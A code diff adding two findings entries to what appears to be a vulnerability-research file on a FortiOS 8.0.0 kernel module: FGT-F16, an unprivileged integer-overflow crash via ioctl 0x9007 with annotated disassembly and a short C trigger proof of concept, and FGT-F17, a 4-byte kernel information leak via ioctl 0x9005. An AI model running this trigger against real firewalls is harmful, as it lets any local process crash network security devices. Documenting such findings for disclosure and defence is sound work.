@@ -890,6 +890,132 @@ ATTACK_CHAIN = {
 }
 
 # ─────────────────────────────────────────────────────────
+# FGT-F16: Integer overflow -> kernel DoS in FortiOS 8.0.0 (FGT-F11 homolog)
+# FortiOS 8.0.0 VM64-KVM vmlinux — fortism ioctl handler at 0x55c546 (ioctl 0x9007 branch)
+# Confirmed via cross-version Ablation BERT homolog tracking + direct disassembly
+# ─────────────────────────────────────────────────────────
+FGT_F16_800_IOCTL_HEAP_OVERFLOW = {
+    "id":       "FGT-F16",
+    "product":  "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM (fortism kernel module)",
+    "severity": "CRITICAL",
+    "class":    "Integer Overflow -> Kernel DoS via fortism LSM file_ioctl hook (FGT-F11 homolog)",
+
+    "description": (
+        "Identical vulnerability class to FGT-F11 (FortiOS 7.4.12), confirmed present in 8.0.0. "
+        "The fortism LSM file_ioctl hook moved to vma 0xffffffff8055c546 in 8.0.0. "
+        "The ioctl 0x9007 integer overflow path is at 0x55c73d: "
+        "`lea edi, [rax+1]` with rax=0xffffffff wraps edi to 0; "
+        "kmalloc(0) returns a valid zero-size SLUB allocation; "
+        "`movsxd rdx, [rbp-0x5c]` sign-extends 0xffffffff to SIZE_MAX; "
+        "copy_from_user(heap_buf, user_str, SIZE_MAX) triggers error path; "
+        "copy_from_user at 0x601b2e has the same error-path bug: "
+        "TWO error paths (overflow jb + addr_limit jb) both reach memset(heap_buf, 0, SIZE_MAX); "
+        "rep stosq from heap_buf until unmapped page -> kernel crash. "
+        "No privilege required; any fd works."
+    ),
+
+    "vmlinux_800": {
+        "binary":  "FortiOS 8.0.0 vmlinux (extracted from flatkc bzImage, P1 of FGT_VM64_KVM-v8.0.0.F-build0167)",
+        "buildid": "474e550043e6c79f25c4e6509765325de60ad04e",
+        "vma_handler":     "0xffffffff8055c546",
+        "foff_handler":    "0x55c546",
+        "vma_0x9007_path": "0xffffffff8055c73d",
+        "foff_0x9007":     "0x55c73d",
+        "vma_copy_from_user": "0xffffffff80601b2e",
+        "foff_copy_from_user": "0x601b2e",
+    },
+
+    "asm_critical_path_0x9007": """
+; 8.0.0 ioctl 0x9007 path at 0xffffffff8055c73d (identical semantics to 7.4.12):
+mov edx, 0x10
+mov rsi, r12                           ; user pointer (ioctl arg)
+lea rdi, [rbp - 0x60]
+call copy_from_user(stack, user, 16)   ; {word0[4], word1_length[4], string_ptr[8]}
+
+mov eax, [rbp - 0x5c]                 ; word1 (user-controlled LENGTH)
+lea edi, [rax + 1]                     ; 32-BIT OVERFLOW: 0xffffffff+1 = 0
+movsxd rdi, edi                        ; sign-extend: rdi=0
+call kmalloc(0, GFP_KERNEL)            ; valid zero-size SLUB allocation
+
+movsxd rdx, [rbp - 0x5c]              ; SIZE_MAX (sign-extend 0xffffffff)
+mov rsi, [rbp - 0x58]                  ; user string_ptr
+mov rdi, rax                            ; zero-size heap buf
+call copy_from_user(heap, user, SIZE_MAX)
+; copy_from_user error path (overflow detected):
+;   jb -> memset(heap_buf, 0, SIZE_MAX) -> rep stosq -> kernel crash
+""",
+
+    "copy_from_user_error_path": {
+        "overflow_jb":    "0x601b51: add rax,r12 (overflow) -> jb 0x601b75 -> memset(dst,0,SIZE_MAX)",
+        "addr_limit_jb":  "0x601b56: jb 0x601b8a -> rax=SIZE_MAX; jmp 0x601b62 -> jne 0x601b6c -> sub/add -> 0x601b75",
+        "memset_call":    "0x601b7d: call 0xce5010 (rep stosq memset) with rdx=SIZE_MAX, rdi=heap_buf, esi=0",
+        "both_paths_trigger_dos": True,
+    },
+
+    "trigger_poc": """
+// Identical to FGT-F11 PoC. No root required. Any process, any fd.
+int fd = open("/dev/null", O_RDONLY);
+void *user_region = mmap(NULL, 4096, PROT_READ, MAP_ANON|MAP_PRIVATE, -1, 0);
+struct { uint32_t word0; uint32_t word1; uint64_t string_ptr; }
+    payload = {1, 0xffffffff, (uint64_t)user_region};
+ioctl(fd, 0x9007, &payload);
+// -> kernel crash via memset(heap_buf, 0, SIZE_MAX) in copy_from_user error path
+""",
+
+    "cross_version_tracking": {
+        "method": "Ablation BERT cross-version homolog tracking + rodata function pointer scan",
+        "7412_foff": "0x552080 (handler), 0x55227e (0x9007 path)",
+        "800_foff":  "0x55c546 (handler), 0x55c73d (0x9007 path)",
+        "offset_delta": "0xa4c6 bytes from 7.4.12 to 8.0.0 (handler), 0xa4bf (0x9007 path)",
+        "rodata_hook_foff_800": "0x123cc88 (fortism LSM hooks structure, +0x60 from base)",
+    },
+
+    "status": "CRITICAL — DoS confirmed by structural analysis; same memset(heap,0,SIZE_MAX) bug in 8.0.0 copy_from_user",
+}
+
+# ─────────────────────────────────────────────────────────
+# FGT-F17: Kernel info leak via fortism ioctl 0x9005 in FortiOS 8.0.0 (FGT-F15 homolog)
+# FortiOS 8.0.0 vmlinux — fortism ioctl handler 0x55c546, ioctl 0x9005 branch at 0x55c6b0
+# ─────────────────────────────────────────────────────────
+FGT_F17_800_IOCTL_INFOLEAK = {
+    "id":       "FGT-F17",
+    "product":  "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM (fortism kernel module)",
+    "severity": "MEDIUM",
+    "class":    "Kernel Information Leak via fortism ioctl 0x9005 — 8.0.0 homolog of FGT-F15",
+
+    "description": (
+        "Identical vulnerability class to FGT-F15 (FortiOS 7.4.12). "
+        "In 8.0.0 ioctl 0x9005 path (vma 0xffffffff8055c6b0): "
+        "`mov rsi, 0xffffffff8188a410; mov rdi, r12; call copy_to_user(r12, 0x8188a410, 4)`. "
+        "Source address changed from 7.4.12's 0x81889310 to 0x8188a410. "
+        "Same: no privilege check, leaks 4 bytes of kernel .data to any caller. "
+        "0x8188a410 is a BSS-zero in static vmlinux (.data section); runtime value "
+        "is a Fortinet internal state counter (same class as FGT-F15's 0x81889310)."
+    ),
+
+    "vmlinux_800": {
+        "vma_0x9005_branch":  "0xffffffff8055c6b0",
+        "foff_0x9005":        "0x55c6b0",
+        "kernel_src_addr":    "0xffffffff8188a410",
+        "copy_size":          "4 bytes",
+        "vs_7412_src_addr":   "0xffffffff81889310 (changed by 0x10100 between versions)",
+    },
+
+    "asm": """
+; 8.0.0 ioctl 0x9005 at 0xffffffff8055c6b0:
+mov edx, 4
+mov rsi, 0xffffffff8188a410   ; kernel .data global (8.0.0 address)
+mov rdi, r12                   ; user destination pointer (ioctl arg)
+call copy_to_user              ; 0x601b00: leaks 4 bytes to userspace, no priv check
+test rax, rax
+jne error
+xor ebx, ebx                   ; return 0 on success
+""",
+
+    "status": "CONFIRMED — same unauthorized kernel state leak pattern as FGT-F15; source address updated for 8.0.0",
+}
+
+# ─────────────────────────────────────────────────────────
 # Forensic extraction commands
 # ─────────────────────────────────────────────────────────
 EXTRACTION_COMMANDS = {
